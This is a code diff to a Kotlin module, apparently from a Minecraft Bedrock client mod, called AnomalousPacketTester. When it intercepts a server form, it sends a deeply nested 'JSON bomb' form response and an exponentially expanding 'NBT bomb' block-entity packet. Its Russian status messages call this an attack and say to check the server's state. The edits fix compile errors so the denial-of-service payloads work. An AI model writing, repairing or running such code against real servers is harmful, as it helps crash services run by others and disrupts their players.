@@ -1,5 +1,6 @@
 package com.mucheng.mucute.client.game.module.misc
 
+import com.mucheng.mucute.client.game.GameSession
 import com.mucheng.mucute.client.game.InterceptablePacket
 import com.mucheng.mucute.client.game.Module
 import com.mucheng.mucute.client.game.ModuleCategory
@@ -31,12 +32,12 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
 
     override fun onEnabled() {
         super.onEnabled()
-        session.displayClientMessage("§a[AnomalousTester] Модуль включен. Ожидание формы-триггера.")
+        if (isSessionCreated) session.displayClientMessage("§a[AnomalousTester] Модуль включен. Ожидание формы-триггера.")
     }
 
     override fun onDisabled() {
         super.onDisabled()
-        session.displayClientMessage("§c[AnomalousTester] Модуль выключен.")
+        if (isSessionCreated) session.displayClientMessage("§c[AnomalousTester] Модуль выключен.")
     }
 
     override fun beforePacketBound(interceptablePacket: InterceptablePacket) {
@@ -49,11 +50,14 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
             session.displayClientMessage("§6[AnomalousTester] Форма перехвачена! Запускаю аномальную атаку...")
 
             GlobalScope.launch {
-                if (testWithDeepJson.value) {
+                // <<< ИЗМЕНЕНО: Убрано .value
+                if (testWithDeepJson) {
                     sendDeeplyNestedFormResponse(packet.formId)
-                    delay(attackDelay.value.toLong())
+                    // <<< ИЗМЕНЕНО: Убрано .value
+                    delay(attackDelay.toLong())
                 }
-                if (testWithNbtBomb.value) {
+                // <<< ИЗМЕНЕНО: Убрано .value
+                if (testWithNbtBomb) {
                     sendNbtBombPacket()
                 }
                 session.displayClientMessage("§a[AnomalousTester] Атака завершена. Проверяйте состояние сервера.")
@@ -64,18 +68,18 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
     private fun sendDeeplyNestedFormResponse(formId: Int) {
         try {
             val responsePacket = ModalFormResponsePacket()
-            // <<< ИЗМЕНЕНО: Используем явный Java-сеттер
             responsePacket.setFormId(formId)
 
             var maliciousJson = "\"leaf\""
-            for (i in 1..jsonNestingDepth.value) {
+            // <<< ИЗМЕНЕНО: Убрано .value
+            for (i in 1..jsonNestingDepth) {
                 maliciousJson = "{\"key\":$maliciousJson}"
             }
-            // <<< ИЗМЕНЕНО: Используем явный Java-сеттер
             responsePacket.setFormData(maliciousJson)
             
-            session.send(responsePacket)
-            session.displayClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: ${jsonNestingDepth.value}).")
+            // <<< ИЗМЕНЕНО: send заменен на sendPacket
+            (session as? GameSession)?.sendPacket(responsePacket)
+            session.displayClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: $jsonNestingDepth).")
         } catch (e: Exception) {
             session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке JSON-бомбы: ${e.message}")
         }
@@ -84,28 +88,31 @@ class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Mis
     private fun sendNbtBombPacket() {
         try {
             val nbtPacket = BlockEntityDataPacket()
-            // <<< ИЗМЕНЕНО: Используем явный Java-сеттер
             nbtPacket.setBlockPosition(Vector3i.ZERO)
 
             val payload: Any = "payload_data"
 
             var currentLevel: Any = payload
-            for (d in 1..nbtBombDepth.value) {
+            // <<< ИЗМЕНЕНО: Убрано .value
+            for (d in 1..nbtBombDepth) {
                 val nextLevel = mutableListOf<Any>()
-                for (w in 1..nbtBombWidth.value) {
+                // <<< ИЗМЕНЕНО: Убрано .value
+                for (w in 1..nbtBombWidth) {
                     nextLevel.add(currentLevel)
                 }
                 currentLevel = nextLevel
             }
             
-            val root = NbtMap.of("bomb", currentLevel)
+            // <<< ИЗМЕНЕНО: NbtMap.of заменен на NbtMap.from(mapOf(...))
+            val root = NbtMap.from(mapOf("bomb" to currentLevel))
 
-            // <<< ИЗМЕНЕНО: Используем явный Java-сеттер
             nbtPacket.setData(root)
             
-            session.send(nbtPacket)
-            val totalElements = Math.pow(nbtBombWidth.value.toDouble(), nbtBombDepth.value.toDouble()).toLong()
-            session.displayClientMessage("§e[AnomalousTester] Отправлена NBT-бомба (глубина: ${nbtBombDepth.value}, ширина: ${nbtBombWidth.value}, ~${totalElements} элементов).")
+            // <<< ИЗМЕНЕНО: send заменен на sendPacket
+            (session as? GameSession)?.sendPacket(nbtPacket)
+            // <<< ИЗМЕНЕНО: Убрано .value
+            val totalElements = Math.pow(nbtBombWidth.toDouble(), nbtBombDepth.toDouble()).toLong()
+            session.displayClientMessage("§e[AnomalousTester] Отправлена NBT-бомба (глубина: $nbtBombDepth, ширина: $nbtBombWidth, ~${totalElements} элементов).")
         } catch (e: Exception) {
             session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке NBT-бомбы: ${e.message}")
         }
